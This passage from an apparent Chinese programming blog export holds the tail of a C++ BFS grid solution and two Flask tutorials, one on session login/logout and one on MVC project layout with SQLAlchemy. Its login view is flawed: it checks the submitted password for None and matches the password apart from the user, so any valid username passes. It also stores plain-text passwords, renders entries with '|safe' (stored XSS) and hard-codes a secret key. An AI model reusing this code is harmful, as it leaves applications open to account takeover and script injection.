class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">q.pop();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;m)!=EOF)&#123;</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;Map[i][j]);</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">                <span class="comment">//讲边缘的标记，里面的不好找，不过边缘联通的一定是不能围住的</span></span><br><span class="line"><span class="keyword">if</span>((i==<span class="number">0</span>||j==<span class="number">0</span>||i==n<span class="number">-1</span>||j==m<span class="number">-1</span>)&amp;&amp;Map[i][j]==<span class="string">'O'</span>)&#123;     </span><br><span class="line">great.x=i;</span><br><span class="line">great.y=j;</span><br><span class="line">vis[i][j]=<span class="number">1</span>;</span><br><span class="line">q.push(great);</span><br><span class="line">bfs();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(vis[i][j]==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">0</span>)        <span class="comment">//如果被标记肯定是围不住的</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"O"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" O"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;               <span class="comment">//否则肯定是被围住的</span></span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"X"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" X"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> 日常训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask利用session实现简单登录退出</title>
      <link href="/2020/03/14/Flask%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%99%BB%E9%99%86/"/>
      <url>/2020/03/14/Flask%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%99%BB%E9%99%86/</url>
      
        <content type="html"><![CDATA[<p>用的session来保存信息</p><a id="more"></a><h2 id="在templates文件夹下添加html文件"><a href="#在templates文件夹下添加html文件" class="headerlink" title="在templates文件夹下添加html文件"></a>在templates文件夹下添加html文件</h2><p id="div-border-left-green">layout.html</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Flaskr<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">stylesheet</span> <span class="attr">type</span>=<span class="string">text/css</span> <span class="attr">href</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; url_for('static', filename='style.css') &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">page</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Flaskr<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">metanav</span>&gt;</span></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> not session.logged_in %&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; url_for('login') &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>log in<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">else</span></span> %&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; url_for('logout') &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>log out<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> message <span class="keyword">in</span> get_flashed_messages() %&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">flash</span>&gt;</span></span><span class="template-variable">&#123;&#123; message &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">block</span></span> body %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endblock</span></span> %&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p id="div-border-left-green">login.html</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">extends</span></span> "layout.html" %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">block</span></span> body %&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> error %&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">error</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Error:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> </span><span class="template-variable">&#123;&#123; error &#125;&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; url_for('login') &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Username:</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">username</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Password:</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Login</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">endblock</span></span> %&#125;</span></span><br></pre></td></tr></table></figure><p id="div-border-left-green">show_entries.html</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">extends</span></span> "layout.html" %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">block</span></span> body %&#125;</span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> session.logged_in %&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; url_for('add_entry') &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">method</span>=<span class="string">'POST'</span> <span class="attr">class</span>=<span class="string">add-entry</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Title:</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">size</span>=<span class="string">30</span> <span class="attr">name</span>=<span class="string">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Text:</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">text</span> <span class="attr">rows</span>=<span class="string">5</span> <span class="attr">cols</span>=<span class="string">40</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Share</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">entries</span>&gt;</span></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> entry <span class="keyword">in</span> entries %&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><span class="template-variable">&#123;&#123; entry.title &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><span class="template-variable">&#123;&#123; entry.content|<span class="name">safe</span> &#125;&#125;</span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">else</span></span> %&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span>Unbelievable.  No entries here so far<span class="tag">&lt;/<span class="name">em</span>&gt;</span></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">endblock</span></span> %&#125;</span></span><br></pre></td></tr></table></figure><h2 id="在static下CSS文件"><a href="#在static下CSS文件" class="headerlink" title="在static下CSS文件"></a>在static下CSS文件</h2><p id="div-border-left-red">style.css</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span>            &#123; <span class="attribute">font-family</span>: sans-serif; <span class="attribute">background</span>: <span class="number">#eee</span>; &#125;</span><br><span class="line"><span class="selector-tag">a</span>, <span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>       &#123; <span class="attribute">color</span>: <span class="number">#377BA8</span>; &#125;</span><br><span class="line"><span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>          &#123; <span class="attribute">font-family</span>: <span class="string">'Georgia'</span>, serif; <span class="attribute">margin</span>: <span class="number">0</span>; &#125;</span><br><span class="line"><span class="selector-tag">h1</span>              &#123; <span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="number">#eee</span>; &#125;</span><br><span class="line"><span class="selector-tag">h2</span>              &#123; <span class="attribute">font-size</span>: <span class="number">1.2em</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.page</span>           &#123; <span class="attribute">margin</span>: <span class="number">2em</span> auto; <span class="attribute">width</span>: <span class="number">35em</span>; <span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">                  <span class="attribute">padding</span>: <span class="number">0.8em</span>; <span class="attribute">background</span>: white; &#125;</span><br><span class="line"><span class="selector-class">.entries</span>        &#123; <span class="attribute">list-style</span>: none; <span class="attribute">margin</span>: <span class="number">0</span>; <span class="attribute">padding</span>: <span class="number">0</span>; &#125;</span><br><span class="line"><span class="selector-class">.entries</span> <span class="selector-tag">li</span>     &#123; <span class="attribute">margin</span>: <span class="number">0.8em</span> <span class="number">1.2em</span>; &#125;</span><br><span class="line"><span class="selector-class">.entries</span> <span class="selector-tag">li</span> <span class="selector-tag">h2</span>  &#123; <span class="attribute">margin-left</span>: -<span class="number">1em</span>; &#125;</span><br><span class="line"><span class="selector-class">.add-entry</span>      &#123; <span class="attribute">font-size</span>: <span class="number">0.9em</span>; <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>; &#125;</span><br><span class="line"><span class="selector-class">.add-entry</span> <span class="selector-tag">dl</span>   &#123; <span class="attribute">font-weight</span>: bold; &#125;</span><br><span class="line"><span class="selector-class">.metanav</span>        &#123; <span class="attribute">text-align</span>: right; <span class="attribute">font-size</span>: <span class="number">0.8em</span>; <span class="attribute">padding</span>: <span class="number">0.3em</span>;</span><br><span class="line">                  <span class="attribute">margin-bottom</span>: <span class="number">1em</span>; <span class="attribute">background</span>: <span class="number">#fafafa</span>; &#125;</span><br><span class="line"><span class="selector-class">.flash</span>          &#123; <span class="attribute">background</span>: <span class="number">#CEE5F5</span>; <span class="attribute">padding</span>: <span class="number">0.5em</span>;</span><br><span class="line">                  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#AACBE2</span>; &#125;</span><br><span class="line"><span class="selector-class">.error</span>          &#123; <span class="attribute">background</span>: <span class="number">#F0D6D6</span>; <span class="attribute">padding</span>: <span class="number">0.5em</span>; &#125;</span><br></pre></td></tr></table></figure><h2 id="在controller目录下新建blog-message-py文件"><a href="#在controller目录下新建blog-message-py文件" class="headerlink" title="在controller目录下新建blog_message.py文件"></a>在controller目录下新建blog_message.py文件</h2><p>其实也就是接口文件&#x3D; &#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># _*_ coding: utf-8 _*_</span></span><br><span class="line"><span class="comment"># @Time  : 2020/3/13 11:32</span></span><br><span class="line"><span class="comment"># @Author: ChenZIDu</span></span><br><span class="line"><span class="comment"># @File  : blog_message.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> blog.model.User <span class="keyword">import</span> User</span><br><span class="line"><span class="keyword">from</span> blog.model.Category <span class="keyword">import</span> Category</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> blog <span class="keyword">import</span> app,db</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request,render_template,flash,abort,url_for,redirect,session,Flask,g</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_entries</span><span class="params">()</span>:</span> <span class="comment"># 从数据库查询出文章的标题和正文。</span></span><br><span class="line">    categorys = Category.query.all()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'show_entries.html'</span>,entries=categorys)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/add',methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_entry</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">'logged_in'</span>):</span><br><span class="line">        abort(<span class="number">401</span>)      <span class="comment"># 请求到此即中断，不会打印下面的语句，并返回HTTP状态码401</span></span><br><span class="line">    title = request.form[<span class="string">'title'</span>]</span><br><span class="line">    content = request.form[<span class="string">'text'</span>]</span><br><span class="line">    category = Category(title, content)</span><br><span class="line">    db.session.add(category)</span><br><span class="line">    db.session.commit()</span><br><span class="line">    flash(<span class="string">'New entry was successfully posted'</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'show_entries'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    error = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        username = request.form[<span class="string">'username'</span>]</span><br><span class="line">        password = request.form[<span class="string">'password'</span>]</span><br><span class="line">        user = User.query.filter_by(username=request.form[<span class="string">'username'</span>]).first()</span><br><span class="line">        passwd = User.query.filter_by(password = request.form[<span class="string">'password'</span>]).first()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            error = <span class="string">'Invalid username'</span></span><br><span class="line">        <span class="keyword">elif</span> password <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            error = <span class="string">'Invalid password'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">'logged_in'</span>] = <span class="literal">True</span></span><br><span class="line">            flash(<span class="string">'You were logged in'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'show_entries'</span>))    <span class="comment">#url_for() 来针对一个特定的函数构建一个 URL</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, error=error)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'logged_in'</span>, <span class="literal">None</span>)</span><br><span class="line">    flash(<span class="string">'You were logged out'</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'show_entries'</span>))</span><br></pre></td></tr></table></figure><p id="div-border-left-blue">在__init__.py文件中引入模块(要在app声明后=.=)</p><p><code>from blog.controller import blog_manage</code></p><p>然后就可以运行试试水了~</p><p><a href="https://www.cnblogs.com/mysql-dba/p/6070258.html" target="_blank" rel="noopener">跟随茁壮的小草大佬</a></p>]]></content>
      
      
      <categories>
          
          <category> Flask </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask框架实现MVC架构+sqlalchemy连接数据库</title>
      <link href="/2020/03/10/Flask%E6%A1%86%E6%9E%B6%E5%AE%9E%E7%8E%B0MVC%E6%9E%B6%E6%9E%84/"/>
      <url>/2020/03/10/Flask%E6%A1%86%E6%9E%B6%E5%AE%9E%E7%8E%B0MVC%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p>果然跟着python2的项目学习Flask有点让人烦躁- - ，除了今天蓝桥杯模拟赛，搞了一天才这么点进度。我去!</p><a id="more"></a><h2 id="什么是MVC架构"><a href="#什么是MVC架构" class="headerlink" title="什么是MVC架构"></a>什么是MVC架构</h2><p id="div-border-left-red">完成后的目录结构是这样的：非常简单，一个static文件夹，一个templates文件夹，一个py文件。</p><p id="div-border-left-blue">以上的目录结构是flask初始时的结构，这个只能应对很小的项目，对于大型复杂的项目，我们需要引入包的管理，MVC架构设计。</p><ul><li>Model（模型）<br>是应用程序中用于处理应用程序数据逻辑的部分。通常模型对象负责在数据库中存取数据。</li><li>View（视图）<br>是应用程序中处理数据显示的部分,通常视图是依据模型数据创建的。</li><li>Controller（控制器）<br>是应用程序中处理用户交互的部分,通常控制器负责从视图读取数据，控制用户输入，并向模型发送数据。</li></ul><p><img src="/1.png" alt="PyCharm"></p><h3 id="目录结构重构，引入包管理"><a href="#目录结构重构，引入包管理" class="headerlink" title="目录结构重构，引入包管理"></a>目录结构重构，引入包管理</h3><ul><li>新建一个runserver.py文件，作为项目统一入口文件</li><li>新建blog2文件夹，把已存在的static,templates,app.py移到blog文件夹下，然后分别建controller、model包(右击blog2，选择python package)。把app.py改名为__init__.py，新建setting.py 文件。</li></ul><ol><li>最上层FirstFlask目录是项目名称，一个项目下可以包括多个模块，也就是应用，每个应用下有自己的配置文件，初始化文件，MVC架构。</li><li>runserver.py：与应用模块平级，作为项目启动文件</li><li>blog文件夹：<blockquote><p>model: MVC中的M，负责在数据库中存取数据。<br>templates：MVC中的V，处理数据显示的部分。<br>controller: MVC中的C，控制器负责控制用户输入，并发送数据。</p></blockquote></li></ol><h2 id="开发代码"><a href="#开发代码" class="headerlink" title="开发代码"></a>开发代码</h2><h3 id="init-py文件"><a href="#init-py文件" class="headerlink" title="__init__.py文件"></a><code>__init__.py</code>文件</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python3</span></span><br><span class="line"><span class="meta"># _*_ coding: utf-8 _*_</span></span><br><span class="line"><span class="meta">#@Time  : 2020/3/10 11:39</span></span><br><span class="line"><span class="meta">#@Author: ChenZIDu</span></span><br><span class="line"><span class="meta">#@File  : __init__.py.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line"><span class="meta">#创建项目对象</span></span><br><span class="line">app = Flask(__name__)</span><br></pre></td></tr></table></figure><h3 id="runserver-py文件"><a href="#runserver-py文件" class="headerlink" title="runserver.py文件"></a>runserver.py文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding: utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> blog <span class="keyword">import</span> app</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')     #路由</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Please login~'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><strong>运行runserver.py文件就可以看到效果了</strong></p><p><a href="http://127.0.0.1:5000/" target="_blank" rel="noopener">http://127.0.0.1:5000</a></p><h3 id="setting-py配置文件"><a href="#setting-py配置文件" class="headerlink" title="setting.py配置文件"></a>setting.py配置文件</h3><p>添加配置数据库连接信息，如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># _*_ coding: utf-8 _*__ * _</span></span><br><span class="line"><span class="comment"># @Time  : 2020/3/10 11:39</span></span><br><span class="line"><span class="comment"># @Author: ChenZIDu</span></span><br><span class="line"><span class="comment"># @File  : setting.py.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调试模式是否开启</span></span><br><span class="line"><span class="attr">DEBUG</span> = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># session 必须要设置key</span></span><br><span class="line"><span class="attr">SECRET_KEY</span> = <span class="string">'A0Zr98j/3yX R~XHH!jmN]LWX/,?RT'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">DIALECT</span> = <span 